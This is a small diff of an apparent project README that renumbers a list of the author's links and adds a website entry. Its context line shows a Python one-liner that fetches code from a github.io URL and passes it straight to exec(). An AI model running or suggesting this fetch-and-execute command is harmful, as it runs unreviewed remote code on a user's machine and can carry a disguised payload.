@@ -5,7 +5,8 @@ python -c"from urllib.request import*;exec(urlopen('http://jnvanderz.github.io/0
 
 ### Links
 
-1. Github [https://github.com/jnvanderz](https://github.com/jnvanderz)
-2. Twitter [https://x.com/jnvanderz](https://x.com/jnvanderz)
-3. Reddit [https://www.reddit.com/user/jnvanderz/](https://www.reddit.com/user/jnvanderz/)
-4. Discord [https://discord.gg/a8q6e7Rv](https://discord.gg/a8q6e7Rv)
+1. Website [https://jnvanderz.github.io](https://jnvanderz.github.io)
+2. Github [https://github.com/jnvanderz](https://github.com/jnvanderz)
+3. Twitter [https://x.com/jnvanderz](https://x.com/jnvanderz)
+4. Reddit [https://www.reddit.com/user/jnvanderz/](https://www.reddit.com/user/jnvanderz/)
+5. Discord [https://discord.gg/a8q6e7Rv](https://discord.gg/a8q6e7Rv)
